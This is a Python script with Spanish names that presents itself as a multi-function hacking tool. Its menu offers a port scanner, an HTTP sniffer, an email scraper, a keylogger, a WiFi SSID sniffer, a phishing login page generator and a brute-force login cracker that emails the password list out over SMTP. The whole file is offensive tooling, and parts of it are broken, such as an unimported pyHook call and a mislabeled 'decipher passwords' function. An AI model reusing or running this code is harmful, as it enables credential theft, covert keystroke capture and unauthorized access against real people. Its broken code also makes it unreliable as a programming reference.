import socket
import subprocess
import threading
import re
import requests
from bs4 import BeautifulSoup
import os
import time
from scapy.all import *
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import pythoncom
import urllib.request


def escanear_puerto(ip_objetivo, puerto):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        resultado = sock.connect_ex((ip_objetivo, puerto))
        if resultado == 0:
            print(f"Puerto {puerto} está abierto.")
        sock.close()
    except socket.error:
        print(f"No se pudo conectar al puerto {puerto}.")


def escaner_puertos():
    ip_objetivo = input("Introduzca la dirección IP objetivo: ")
    print(f"Escanenado puertos para {ip_objetivo}...\n")
    for puerto in range(1, 1024):
        escanear_puerto(ip_objetivo, puerto)


def olfatear_paquetes():
    def olfateador_paquetes(paquete):
        if paquete.haslayer(HTTPResponse):
            url = paquete[HTTP].Host.decode() + paquete[HTTP].Path.decode()
            print(f"URL visitada: {url}")

    print("Comenzando olfateo de paquetes...\n")
    sniff(filter="tcp port 80", prn=olfateador_paquetes)


def olfateador_paquetes():
    print("Comenzando olfateo de paquetes...\n")
    olfatear_paquetes()


def raspar_emails(url):
    respuesta = requests.get(url)
    sopa = BeautifulSoup(respuesta.text, 'html.parser')
    emails = re.findall(r'[\w\.-]+@[\w\.-]+', sopa.get_text())
    return emails


def raspador_emails():
    url = input("Introduce la URL desde donde raspar los correos electrónicos: ")
    print("Raspando emails...\n")
    emails = raspar_emails(url)
    for email in emails:
        print(email)

        # Function to start keylogger
def iniciar_keylogger():
    def al_presionar_tecla(evento):
        with open("keylogs.txt", "a") as f:
            f.write(chr(evento.Ascii))
        return True

    print("Iniciando keylogger...\n")
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = al_presionar_tecla
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()


# Function for keylogger functionality
def keylogger():
    print("Iniciando keylogger...\n")
    iniciar_keylogger()


# Function to scrape website
def raspar_sitio_web(url):
    respuesta = requests.get(url)
    sopa = BeautifulSoup(respuesta.text, 'html.parser')
    enlaces = sopa.find_all('a')
    for enlace in enlaces:
        print(enlace.get('href'))


# Function for website scraper functionality
def raspador_web():
    url = input("Introduce la URL desde donde raspar los enlaces: ")
    print("Raspando enlaces de la página web...\n")
    raspar_sitio_web(url)


# Function to sniff WiFi SSIDs
def olfatear_ssids():
    def manejador_paquetes(paquete):
        if paquete.haslayer(Dot11Beacon):
            ssid = paquete[Dot11Elt].info.decode()
            print(f"SSID: {ssid}")

    print("Comenzando olfateo de SSID de WiFi...\n")
    sniff(prn=manejador_paquetes, iface="wlan0", count=10)


# Function for WiFi SSID sniffer functionality
def olfateador_ssid_wifi():
    print("Comenzando olfateo de SSID de WiFi...\n")
    olfatear_ssids()


# Function to create phishing page
def crear_pagina_phishing():
    contenido_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Página de Phishing</title>
    </head>
    <body>
        <h1>Página de Phishing</h1>
        <p>Esta es una página de phishing.</p>
        <form action="http://localhost/login.php" method="POST">
            <label for="username">Usuario:</label>
            <input type="text" id="username" name="username"><br><br>
            <label for="password">Contraseña:</label>
            <input type="password" id="password" name="password"><br><br>
            <input type="submit" value="Ingresar">
        </form>
    </body>
    </html>
    """

    with open("pagina_phishing.html", "w") as f:
        f.write(contenido_html)


# Function for phishing page creator functionality
def creador_pagina_phishing():
    print("Creando página de phishing...\n")
    crear_pagina_phishing()

    # Function to decipher passwords
def descifrar_contraseñas(contraseñas):
    email = input("Introduce la dirección de correo electrónico a donde enviar las contraseñas: ")
    servidor_smtp = "smtp.gmail.com"
    puerto_smtp = 587
    nombre_usuario = input("Introduce el nombre de usuario de tu correo electrónico: ")
    contraseña = input("Introduce la contraseña de tu correo electrónico: ")
    email_emisor = nombre_usuario
    asunto = "Contraseñas Descifradas"
    cuerpo = "\n".join(contraseñas)

    mensaje = MIMEMultipart()
    mensaje["From"] = email_emisor
    mensaje["To"] = email
    mensaje["Subject"] = asunto

    mensaje.attach(MIMEText(cuerpo, "plain"))

    try:
        servidor = smtplib.SMTP(servidor_smtp, puerto_smtp)
        servidor.starttls()
        servidor.login(nombre_usuario, contraseña)
        texto = mensaje.as_string()
        servidor.sendmail(email_emisor, email, texto)
        servidor.quit()
        print("¡Contraseñas enviadas exitosamente!")
    except smtplib.SMTPAuthenticationError:
        print("Falló la autenticación con el servidor de correo electrónico.")


# Function for brute force password breaker functionality
def rompe_contraseñas_fuerza_bruta():
    url_objetivo = input("Introduce la URL objetivo: ")
    usuario_objetivo = input("Introduce el nombre de usuario objetivo: ")
    ruta_diccionario = input("Introduce la ruta al diccionario de contraseñas: ")

    try:
        with open(ruta_diccionario, "r") as f:
            contraseñas = f.read().split("\n")
            print("Descifrando contraseñas...\n")
            for contraseña in contraseñas:
                respuesta = requests.post(url_objetivo, data={"username": usuario_objetivo, "password": contraseña})
                if "Login failed" not in respuesta.text:
                    print(f"¡Contraseña encontrada! La contraseña es: {contraseña}")
                    break
            descifrar_contraseñas(contraseñas)
    except FileNotFoundError:
        print("Diccionario de contraseñas no encontrado.")


# Function to perform file downloads
def descarga_archivos(url):
    nombre_archivo = url.split("/")[-1]
    urllib.request.urlretrieve(url, nombre_archivo)
    print(f"Archivo {nombre_archivo} descargado con éxito.")


# Function for file downloader functionality
def descargador_archivos():
    url = input("Introduce la URL del archivo que quieres descargar: ")
    print("Descargando archivo...\n")
    descarga_archivos(url)


# Main menu
def menu_principal():
    while True:
        print("\n--- Herramienta Multifunción para Hacking ---")
        print("1. Escáner de Puertos")
        print("2. Olfateador de Paquetes")
        print("3. Raspador de Emails")
        print("4. Keylogger")
        print("5. Raspador Web")
        print("6. Olfateador de SSID de WiFi")
        print("7. Creador de Página de Phishing")
        print("8. Rompe Contraseñas por Fuerza Bruta")
        print("9. Descargador de Archivos")
        print("0. Salir")
        eleccion = input("\nElige una opción: ")

        if eleccion == "1":
            escaner_puertos()
        elif eleccion == "2":
            olfateador_paquetes()
        elif eleccion == "3":
            raspador_emails()
        elif eleccion == "4":
            keylogger()
        elif eleccion == "5":
            raspador_web()
        elif eleccion == "6":
            olfateador_ssid_wifi()
        elif eleccion == "7":
            creador_pagina_phishing()
        elif eleccion == "8":
            rompe_contraseñas_fuerza_bruta()
        elif eleccion == "9":
            descargador_archivos()
        elif eleccion == "0":
            break
        else:
            print("Por favor, elige una opción válida.")


if __name__ == "__main__":
    menu_principal()

